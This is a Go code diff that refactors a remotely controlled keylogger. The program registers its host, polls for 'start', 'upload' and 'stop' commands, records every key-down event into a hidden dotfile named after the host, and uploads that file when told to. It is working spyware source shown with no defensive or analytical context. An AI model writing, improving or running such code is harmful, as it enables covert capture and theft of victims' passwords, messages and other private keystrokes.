@@ -30,18 +30,28 @@ func main() {
 		panic(err)
 	}
 
+	putHost(hostName)
+
+	runTime := time.Now()
+	fileName := fmt.Sprintf(".%s - %s %s.txt",
+	hostName,
+	runTime.Format("Jan 02 2006"),
+	runTime.Format(time.Kitchen))
+
 	cmdChan := make(chan string)
 	go pollCmds(hostName, cmdChan)
-
-	fmt.Println("test")
 
 	for {
 		cmd := <-cmdChan
 		if cmd == "start" {
-			go startKeylog(hostName, cmdChan)
+			go startKeylog(hostName, fileName, cmdChan)
 		}
 		if cmd == "upload" {
-			go startKeylog(hostName, cmdChan)
+			go uploadFile(fileName)
+			hook.StopEvent()
+		}
+		if cmd == "stop" {
+			hook.StopEvent()
 		}
 	}
 }
@@ -59,21 +69,10 @@ func pollCmds(hostName string, cmdChan chan<- string) {
 	}
 }
 
-func stopKeylog() {
-	hook.End()
-}
-
-func startKeylog(hostName string, cmdChan chan string) {
+func startKeylog(hostName string, fileName string, cmdChan chan string) {
 	evChan := hook.Start()
-	defer hook.End()
 
 	var lastTime time.Time
-	runTime := time.Now()
-
-	fileName := fmt.Sprintf(".%s - %s %s.txt",
-	hostName,
-	runTime.Format("Jan 02 2006"),
-	runTime.Format(time.Kitchen))
 
 	file, err := os.Create(fileName)
 	if err != nil {
@@ -81,32 +80,23 @@ func startKeylog(hostName string, cmdChan chan string) {
 	}
 	defer file.Close()
 
-	for {
-		select {
-		case ev := <-evChan:
-			// Calcs diff between time
-			now := time.Now()
-			var diff time.Duration
-			if !lastTime.IsZero() {
-				diff = now.Sub(lastTime)
-			}
-			lastTime = now
-	
-			// If diff > 5 print a new line for ease of reading
-			if diff.Seconds() > 5 {
-				file.WriteString("\n")
-			}
-	
-			// Print to file any keystroke recorded and their keychar value
+	for ev := range evChan {
+		// Calcs diff between time
+		now := time.Now()
+		var diff time.Duration
+		if !lastTime.IsZero() {
+			diff = now.Sub(lastTime)
+		}
+		lastTime = now
+
+		// If diff > 5 print a new line for ease of reading
+		if diff.Seconds() > 5 {
+			file.WriteString("\n")
+		}
+
+		// Print to file any keystroke recorded and their keychar value
+		if ev.Kind == hook.KeyDown {
 			file.WriteString(hook.RawcodetoKeychar(ev.Rawcode))
-		case cmd := <-cmdChan:
-			if cmd == "upload" {
-				uploadFile(fileName)
-			}
-			if cmd == "stop" {
-				file.Close()
-				return
-			}
 		}
 	}
 }
